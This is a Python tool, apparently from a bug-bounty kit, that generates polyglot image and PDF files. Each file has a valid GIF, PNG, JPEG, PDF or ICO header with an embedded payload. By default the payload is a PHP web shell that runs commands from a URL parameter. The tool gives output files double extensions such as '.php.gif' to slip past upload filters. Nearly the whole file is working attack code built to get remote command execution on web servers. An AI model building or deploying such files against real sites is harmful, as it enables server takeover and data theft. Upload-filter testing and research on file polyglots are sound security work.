#!/usr/bin/env python3
"""Polyglot Factory — generates valid polyglot files (valid image/format header + embedded payload).

Usage:
    python3 polyglot_factory.py --payload "<?php system(\$_GET['cmd']); ?>" --output-format gif
    python3 polyglot_factory.py --payload-file shell.php --output-format png
    python3 polyglot_factory.py --payload-string "<?php echo 'POLY_TEST'; ?>" --output-format jpg
"""
import argparse
import json
import os
import struct
import sys
import zlib
from datetime import datetime, timezone


PHP_OPEN = b"<?php "
PHP_CLOSE = b" ?>\n"
PHP_DIE = b"__HALT_COMPILER(); ?>\n"


def build_gif_polyglot(payload_bytes):
    # GIF89a header + image descriptor + PHP embedded in comment extension
    result = bytearray()
    result += b"GIF89a"
    # Logical screen descriptor: width=1, height=1, no global color table
    result += struct.pack("<HH", 1, 1)
    # Packed fields: no global color table
    result += b"\x00"
    # Background color: 0
    result += b"\x00"
    # Pixel aspect ratio: 0
    result += b"\x00"

    # Comment extension block (PHP will be embedded here)
    result += b"\x21\xfe"
    comment = b"GIF_POLYGLOT"
    result += bytes([len(comment)])
    result += comment

    # PHP payload embedded in another comment or directly
    result += b"\x21\xfe"
    php_block = b"\n" + payload_bytes + b"\n"
    # Split into chunks of 255 or less
    chunk = php_block[:255]
    result += bytes([len(chunk)])
    result += chunk
    php_block = php_block[255:]

    for i in range(0, len(php_block), 255):
        result += b"\x21\xfe"
        chunk = php_block[i:i+255]
        result += bytes([len(chunk)])
        result += chunk

    result += b"\x00"  # Trailer
    result += b";"  # GIF terminator

    # Append PHP payload that will actually execute
    result += b"\n" + payload_bytes + b"\n"

    return bytes(result)


def build_png_polyglot(payload_bytes):
    result = bytearray()
    # PNG signature
    result += b"\x89PNG\r\n\x1a\n"

    # IHDR chunk
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b"IHDR" + ihdr_data)
    result += struct.pack(">I", 13)  # chunk length
    result += b"IHDR"
    result += ihdr_data
    result += struct.pack(">I", ihdr_crc)

    # pHYs chunk (physical pixel dimensions)
    phys_data = struct.pack(">IIB", 2835, 2835, 1)
    phys_crc = zlib.crc32(b"pHYs" + phys_data)
    result += struct.pack(">I", 9)
    result += b"pHYs"
    result += phys_data
    result += struct.pack(">I", phys_crc)

    # PHP payload as custom comment (tEXt chunk)
    comment_text = b"Payload\x00" + b"php_code_embedded"
    comment_crc = zlib.crc32(b"tEXt" + comment_text)
    result += struct.pack(">I", len(comment_text))
    result += b"tEXt"
    result += comment_text
    result += struct.pack(">I", comment_crc)

    # IDAT chunk (minimal image data)
    raw_data = b"\x00\xff\x00\xff\x00\xff"
    compressed = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b"IDAT" + compressed)
    result += struct.pack(">I", len(compressed))
    result += b"IDAT"
    result += compressed
    result += struct.pack(">I", idat_crc)

    # IEND chunk
    iend_crc = zlib.crc32(b"IEND")
    result += struct.pack(">I", 0)
    result += b"IEND"
    result += struct.pack(">I", iend_crc)

    # PHP payload appended after PNG data
    result += b"\n" + payload_bytes + b"\n"

    return bytes(result)


def build_jpg_polyglot(payload_bytes):
    result = bytearray()

    # JPEG SOI marker
    result += b"\xff\xd8"

    # APP0 JFIF marker
    app0_data = b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    result += b"\xff\xe0"
    result += struct.pack(">H", len(app0_data) + 2)
    result += app0_data

    # APP1 EXIF marker (embed PHP here)
    exif_header = b"Exif\x00\x00"
    # Embed PHP in EXIF data
    exif_data = exif_header + b"\n<!-- " + payload_bytes + b" -->\n"
    result += b"\xff\xe1"
    result += struct.pack(">H", len(exif_data) + 2)
    result += exif_data

    # Small valid JPEG frame (SOS with minimal data)
    # DQT marker
    dqt_data = b"\x00" + bytes([16] * 64)
    result += b"\xff\xdb"
    result += struct.pack(">H", len(dqt_data) + 2)
    result += dqt_data

    # SOF0 marker (Baseline DCT)
    sof0_data = b"\x08\x00\x01\x00\x01\x00\x01\x01\x01\x01\x00"
    result += b"\xff\xc0"
    result += struct.pack(">H", len(sof0_data) + 2)
    result += sof0_data

    # DHT marker
    huff_data = b"\x00" + b"\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00" + bytes([0]*12)
    result += b"\xff\xc4"
    result += struct.pack(">H", len(huff_data) + 2)
    result += huff_data

    # SOS marker with minimal data
    sos_data = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00"
    result += b"\xff\xda"
    result += struct.pack(">H", len(sos_data) + 2)
    result += sos_data
    result += b"\x00\x00"

    # EOI marker
    result += b"\xff\xd9"

    # PHP payload tacked on after JPEG
    result += b"\n" + payload_bytes + b"\n"

    return bytes(result)


def build_pdf_polyglot(payload_bytes):
    result = bytearray()
    result += b"%PDF-1.7\n"
    result += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    result += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    result += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
    result += b"xref\n0 4\n0000000000 65535 f \n0000000017 00000 n \n0000000066 00000 n \n0000000121 00000 n \n"
    result += b"trailer\n<< /Root 1 0 R /Size 4 >>\nstartxref\n176\n%%EOF\n"

    # Embed PHP payload as annotations or invisible content
    result += b"\n" + payload_bytes + b"\n"

    return bytes(result)


def build_ico_polyglot(payload_bytes):
    result = bytearray()
    # ICO header
    result += struct.pack("<HHH", 0, 1, 1)

    # Icon entry: 1x1, no compression
    icon_size = 1 * 1  # minimal
    result += struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 0, icon_size, 22)
    result += b"\xff\xff\xff\x00"  # minimal bitmap data

    result += b"\n" + payload_bytes + b"\n"
    return bytes(result)


POLYGLOT_BUILDERS = {
    "gif": build_gif_polyglot,
    "png": build_png_polyglot,
    "jpg": build_jpg_polyglot,
    "jpeg": build_jpg_polyglot,
    "pdf": build_pdf_polyglot,
    "ico": build_ico_polyglot,
}

FORMAT_MIME = {
    "gif": "image/gif",
    "png": "image/png",
    "jpg": "image/jpeg",
    "jpeg": "image/jpeg",
    "pdf": "application/pdf",
    "ico": "image/x-icon",
}


def load_context(ctx_path):
    if not ctx_path or not os.path.exists(ctx_path):
        return {}
    try:
        with open(ctx_path) as f:
            return json.load(f)
    except Exception:
        return {}


def validate_php_payload(payload_bytes):
    markers = [b"<?php", b"<?=", b"<?\n"]
    for marker in markers:
        if marker in payload_bytes:
            return True
    if payload_bytes.startswith(b"<?"):
        return True
    return False


def main():
    ap = argparse.ArgumentParser(description="Polyglot Factory — generate polyglot files with embedded payloads")
    ap.add_argument("--output-format", required=True, choices=["gif", "png", "jpg", "jpeg", "pdf", "ico"], help="Output polyglot format (gif, png, jpg, pdf, ico)")
    ap.add_argument("--output", default=None, help="Output file path (default: auto-generated)")
    ap.add_argument("--payload-file", default=None, help="File containing the payload to embed")
    ap.add_argument("--payload-string", default=None, help="Payload string to embed")
    ap.add_argument("--payload", default=None, help="Inline payload string")
    ap.add_argument("--context", default=None, help="Path to .bb/context.json for session configuration")
    ap.add_argument("--dry-run", action="store_true", help="Show what would be generated without writing")
    args = ap.parse_args()

    context = load_context(args.context)
    outdir = context.get("OUTDIR", os.getcwd())

    # Resolve payload source
    payload = None
    payload_source = None

    if args.payload_file:
        if not os.path.exists(args.payload_file):
            sys.stderr.write(f"[ERROR] Payload file not found: {args.payload_file}\n")
            sys.exit(1)
        with open(args.payload_file, "rb") as f:
            payload = f.read()
        payload_source = f"file:{args.payload_file}"

    elif args.payload_string:
        payload = args.payload_string.encode("utf-8")
        payload_source = "string"

    elif args.payload:
        payload = args.payload.encode("utf-8")
        payload_source = "inline"

    else:
        payload = b"<?php system($_GET['cmd']); ?>\n"
        payload_source = "default"

    sys.stderr.write(f"[*] Output format: {args.output_format}\n")
    sys.stderr.write(f"[*] Payload source: {payload_source}\n")
    sys.stderr.write(f"[*] Payload length: {len(payload)} bytes\n")
    sys.stderr.write(f"[*] Payload preview: {payload[:80]}\n")

    is_php = validate_php_payload(payload)
    if is_php:
        sys.stderr.write("[*] PHP payload detected\n")
    else:
        sys.stderr.write("[!] Warning: payload does not appear to be PHP\n")

    if args.dry_run:
        sys.stderr.write(f"\n[DRY RUN] Would generate {args.output_format} polyglot with {len(payload)} bytes of payload\n")
        sys.stderr.write(f"  Payload: {payload[:100]}\n")
        sys.stderr.write(f"  MIME type: {FORMAT_MIME.get(args.output_format, 'application/octet-stream')}\n")
        sys.stdout.write(json.dumps({
            "status": "dry_run",
            "format": args.output_format,
            "payload_len": len(payload),
            "mime": FORMAT_MIME.get(args.output_format, "application/octet-stream"),
        }))
        return

    # Choose builder
    fmt = args.output_format.lower()
    builder = POLYGLOT_BUILDERS.get(fmt)
    if not builder:
        sys.stderr.write(f"[ERROR] Unsupported format: {fmt}\n")
        sys.exit(1)

    sys.stderr.write(f"[*] Building {fmt} polyglot...\n")
    polyglot_bytes = builder(payload)

    # Determine output path
    if args.output:
        output_path = args.output
    else:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        ext_map = {"gif": "gif", "png": "png", "jpg": "jpg", "jpeg": "jpg", "pdf": "pdf", "ico": "ico"}
        ext = ext_map.get(fmt, "bin")
        fname = f"polyglot_{fmt}_{ts}"
        if "php" in payload.decode("utf-8", errors="replace").lower():
            fname += ".php.gif" if fmt == "gif" else f".php.{ext}"
        else:
            fname += f".{ext}"
        output_path = os.path.join(outdir, fname)

    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    with open(output_path, "wb") as f:
        f.write(polyglot_bytes)

    file_size = len(polyglot_bytes)
    sys.stderr.write(f"[*] Written {file_size} bytes to {output_path}\n")

    # Validate the output
    valid = False
    validation_info = {}
    if fmt in ("gif",):
        valid = polyglot_bytes[:6] in (b"GIF89a", b"GIF87a")
        validation_info["magic_bytes"] = polyglot_bytes[:6].decode("ascii", errors="replace") if len(polyglot_bytes) >= 6 else "?"
    elif fmt == "png":
        valid = polyglot_bytes[:8] == b"\x89PNG\r\n\x1a\n"
        validation_info["magic_bytes"] = "PNG (valid)" if valid else "INVALID"
    elif fmt in ("jpg", "jpeg"):
        valid = polyglot_bytes[:2] == b"\xff\xd8" and polyglot_bytes.rstrip(b"\x00")[-2:] == b"\xff\xd9"
        validation_info["magic_bytes"] = "JPEG SOI+EOI (valid)" if valid else "JPEG markers present"
    elif fmt == "pdf":
        valid = polyglot_bytes[:8].startswith(b"%PDF-")
        validation_info["magic_bytes"] = "PDF header (valid)" if valid else "?"
    elif fmt == "ico":
        valid = len(polyglot_bytes) >= 6 and polyglot_bytes[:2] == b"\x00\x00"
        validation_info["magic_bytes"] = "ICO header present"

    validation_info["format_valid"] = valid
    validation_info["payload_embedded"] = payload in polyglot_bytes

    result = {
        "output_path": output_path,
        "format": fmt,
        "mime_type": FORMAT_MIME.get(fmt, "application/octet-stream"),
        "file_size": file_size,
        "payload_len": len(payload),
        "payload_source": payload_source,
        "validation": validation_info,
        "php_detected": is_php,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    sys.stderr.write(f"[OUTPUT] -> {output_path}\n")
    sys.stderr.write(f"[VALIDATION] format_valid={valid}, payload_embedded={validation_info['payload_embedded']}\n")

    sys.stdout.write(json.dumps(result) + "\n")


if __name__ == "__main__":
    main()